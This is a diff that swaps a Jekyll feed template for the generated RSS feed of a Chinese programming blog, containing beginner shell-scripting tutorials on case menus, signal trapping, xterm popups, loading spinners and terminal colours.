@@ -1,22 +1,748 @@
----  
-layout: none  
----  
-  
 <?xml version="1.0" encoding="UTF-8"?>  
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">  
     <channel>  
-        <title>{{ site.name }}</title>  
-        <description>{{ site.description }}</description>  
-        <link>{{ site.baseurl}}{{ site.url }}</link>  
-        <atom:link href="{{ site.baseurl}}{{ site.url }}/feed.xml" rel="self" type="application/rss+xml" />  
-        {% for post in site.posts limit:10 %}  
+        <title></title>  
+        <description>王俊博客，软件改变世界！王俊博客是作者个人知识库、是记录历程回顾的笔记本、是经验教训的资源池， 旨在促进软件开发领域知识与创新的传播，为软件开发中提供帮助。更多是作者本人的经验积累。
+</description>  
+        <link>http://localhost:4000</link>  
+        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
+          
             <item>  
-               <title>{{ post.title }}</title>  
-               <description>{{ post.content | xml_escape }}</description>  
-               <pubDate>{{ post.date | date: "%a, %d %b %Y %H:%M:%S %z" }}</pubDate>  
-               <link>{{ site.url }}{{ site.baseurl}}{{ post.url }}</link>  
-               <guid isPermaLink="true">{{ site.url }}{{ site.baseurl}}{{ post.url }}</guid>  
+               <title>Shell中switch条件选择语句的执行示例</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#shell中switch条件选择语句的执行示例&quot; id=&quot;markdown-toc-shell中switch条件选择语句的执行示例&quot;&gt;Shell中switch条件选择语句的执行示例&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#脚本&quot; id=&quot;markdown-toc-脚本&quot;&gt;脚本&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;shell中switch条件选择语句的执行示例&quot;&gt;Shell中switch条件选择语句的执行示例&lt;/h1&gt;
+
+&lt;h2 id=&quot;脚本&quot;&gt;脚本&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 定义一个选择语言的方法&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;language &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+	clear
+	&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;do
+		&lt;/span&gt;clear
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;[i] Select your language&quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;                                       &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [1] English          &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [2] German      &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [3] Romanian     &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [4] Turkish    &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [5] Spanish    &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [6] Chinese   &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [7] Italian   &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [8] Czech   &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;      [9] Greek   &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;                                       &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -n -e &lt;span class=&quot;s2&quot;&gt;&quot;[deltaxflux@fluxion]-[~] &quot;&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;yn
+		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$yn&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in
+			&lt;/span&gt;1 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; english; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			2 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; german; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			3 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; romanian; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			4 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; turkish; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			5 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; spanish; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			6 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; chinese; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			7 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; italian; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			8 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; czech; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			9 &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; greek; invokeMethod; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+			skip &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; english; skipme; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; 
+			&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Unknown option. Please choose again&quot;&lt;/span&gt;; clear &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+		  &lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+language
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Tue, 10 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/shell-switch-cond/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/shell-switch-cond/</guid>  
                </item>  
-        {% endfor %}  
+          
+            <item>  
+               <title>Shell执行中信号捕获的处理方式</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#shell执行中信号捕获的处理方式&quot; id=&quot;markdown-toc-shell执行中信号捕获的处理方式&quot;&gt;Shell执行中信号捕获的处理方式&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#介绍&quot; id=&quot;markdown-toc-介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#脚本&quot; id=&quot;markdown-toc-脚本&quot;&gt;脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#信号&quot; id=&quot;markdown-toc-信号&quot;&gt;信号&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;shell执行中信号捕获的处理方式&quot;&gt;Shell执行中信号捕获的处理方式&lt;/h1&gt;
+
+&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
+
+&lt;p&gt;当shell在执行过程中，使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CTRL+C&lt;/code&gt;可以中断当前shell的执行，强制中断执行时可能需要做些清理任务，此时可以捕获中断信号进行shell进程结束前的处理。&lt;/p&gt;
+
+&lt;h2 id=&quot;脚本&quot;&gt;脚本&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 定义中断执行方法&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;exitmode&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;clear temp file&quot;&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 注册信号处理&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;exitmode SIGINT SIGHUP
+
+&lt;span class=&quot;c&quot;&gt;# 模拟一个10秒的任务&lt;/span&gt;
+sleep 10
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;信号&quot;&gt;信号&lt;/h2&gt;
+
+&lt;p&gt;在unix系统中使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;kill -l&lt;/code&gt;查看所有支持的信号&lt;/p&gt;
+</description>  
+               <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/shell-trap-process/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/shell-trap-process/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Shell执行时弹出xterm子进程终端窗口</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#shell执行时弹出xterm子进程终端窗口&quot; id=&quot;markdown-toc-shell执行时弹出xterm子进程终端窗口&quot;&gt;Shell执行时弹出xterm子进程终端窗口&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#介绍&quot; id=&quot;markdown-toc-介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#示例脚本&quot; id=&quot;markdown-toc-示例脚本&quot;&gt;示例脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#参数解释&quot; id=&quot;markdown-toc-参数解释&quot;&gt;参数解释&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;shell执行时弹出xterm子进程终端窗口&quot;&gt;Shell执行时弹出xterm子进程终端窗口&lt;/h1&gt;
+
+&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
+
+&lt;p&gt;不知道是否在看美国大片时，黑客执行某些工具，整个屏幕会时不时弹出多个终端窗口在执行，看似很酷的样子，其实实现很简单，每弹出的窗口都是作为一个子进程在运行，下面介绍实现方案。&lt;/p&gt;
+
+&lt;h2 id=&quot;示例脚本&quot;&gt;示例脚本&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 弹出位置定义&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;TOPLEFT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-geometry 90x13+0+0&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;TOPRIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-geometry 83x26-0+0&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BOTTOMLEFT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-geometry 90x24+0-0&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BOTTOMRIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-geometry 75x12-0-0&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;TOPLEFTBIG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-geometry 91x42+0+0&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;TOPRIGHTBIG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-geometry 83x26-0+0&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 左上角弹出执行ping的命令&lt;/span&gt;
+xterm -hold -title &lt;span class=&quot;s2&quot;&gt;&quot;test title&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TOPLEFT&lt;/span&gt; -bg &lt;span class=&quot;s2&quot;&gt;&quot;#000000&quot;&lt;/span&gt; -fg &lt;span class=&quot;s2&quot;&gt;&quot;#FFFFFF&quot;&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;ping www.baidu.com&quot;&lt;/span&gt; &amp;amp;
+
+&lt;span class=&quot;c&quot;&gt;# 右上角弹出执行下载的命令&lt;/span&gt;
+xterm -hold -title &lt;span class=&quot;s2&quot;&gt;&quot;test title&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$TOPRIGHT&lt;/span&gt; -bg &lt;span class=&quot;s2&quot;&gt;&quot;#000000&quot;&lt;/span&gt; -fg &lt;span class=&quot;s2&quot;&gt;&quot;#FFFFFF&quot;&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;wget http://nginx.org/download/nginx-1.10.2.tar.gz&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;xterm是阻塞式运行，即地一个xterm不执行完不会执行第二个，可以加上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt;号让其后台执行，但如果两个xterm都加上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt;号则主shell进行会立即关闭。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;参数解释&quot;&gt;参数解释&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;名称&lt;/th&gt;
+      &lt;th&gt;含义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-hold&lt;/td&gt;
+      &lt;td&gt;开启资源等待模式。shell执行完成不会销毁窗口&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-title&lt;/td&gt;
+      &lt;td&gt;定义终端标题&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-geometry&lt;/td&gt;
+      &lt;td&gt;大小和坐标定义&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-bg&lt;/td&gt;
+      &lt;td&gt;背景色定义&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-fg&lt;/td&gt;
+      &lt;td&gt;前景色定义&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;-e&lt;/td&gt;
+      &lt;td&gt;需要执行的任务&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</description>  
+               <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/shell-pop-xterm/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/shell-pop-xterm/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Shell执行任务时的loading效果</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#shell执行任务时的loading效果&quot; id=&quot;markdown-toc-shell执行任务时的loading效果&quot;&gt;Shell执行任务时的loading效果&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#脚本&quot; id=&quot;markdown-toc-脚本&quot;&gt;脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#截图&quot; id=&quot;markdown-toc-截图&quot;&gt;截图&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;shell执行任务时的loading效果&quot;&gt;Shell执行任务时的loading效果&lt;/h1&gt;
+
+&lt;h2 id=&quot;脚本&quot;&gt;脚本&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# loading状态方法&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;spinner &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.15
+	&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;spinstr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'|/-\'&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;ps a | awk &lt;span class=&quot;s1&quot;&gt;'{print $1}'&lt;/span&gt; | grep &lt;span class=&quot;nv&quot;&gt;$pid&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;do
+			&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;spinstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;#?&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+			&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; [%c]  &quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$spinstr&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+			&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;spinstr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$temp&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;spinstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$temp&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+			sleep &lt;span class=&quot;nv&quot;&gt;$delay&lt;/span&gt;
+			&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b\b\b\b\b\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;done
+	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;    &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\b\b\b\b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 模拟耗时的任务&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;execute&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    sleep 5
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;s2&quot;&gt;&quot;Loading...&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 后台执行耗时的任务&lt;/span&gt;
+execute &amp;amp;
+&lt;span class=&quot;c&quot;&gt;# 启动loading效果&lt;/span&gt;
+spinner &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$!&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;截图&quot;&gt;截图&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/shell-loading-status.png&quot; alt=&quot;shell-loading&quot; /&gt;&lt;/p&gt;
+</description>  
+               <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/shell-loading-status/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/shell-loading-status/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Shell定义在终端执行时的字体颜色</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#shell定义在终端执行时的字体颜色&quot; id=&quot;markdown-toc-shell定义在终端执行时的字体颜色&quot;&gt;Shell定义在终端执行时的字体颜色&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#介绍&quot; id=&quot;markdown-toc-介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#脚本&quot; id=&quot;markdown-toc-脚本&quot;&gt;脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#截图&quot; id=&quot;markdown-toc-截图&quot;&gt;截图&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;shell定义在终端执行时的字体颜色&quot;&gt;Shell定义在终端执行时的字体颜色&lt;/h1&gt;
+
+&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
+
+&lt;p&gt;在&lt;strong&gt;kali&lt;/strong&gt;系统中的一些shell工具时，常常会发现很多编写shell的技巧，本篇文章将介绍如何在shell的执行过程中定义输出字体的颜色和样式。&lt;/p&gt;
+
+&lt;h2 id=&quot;脚本&quot;&gt;脚本&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 标准颜色定义&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Black&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;30m'&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# Black&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Red&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;31m'&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# Red&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Green&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;32m'&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# Green&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Yellow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;33m'&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# Yellow&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Blue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;34m'&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# Blue&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Purple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;35m'&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# Purple&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;Cyan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;36m'&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# Cyan&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;White&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[0;37m'&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# White&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 粗体颜色定义&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BBlack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;30m'&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# Black&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BRed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;31m'&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# Red&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BGreen&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;32m'&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# Green&lt;/span&gt;
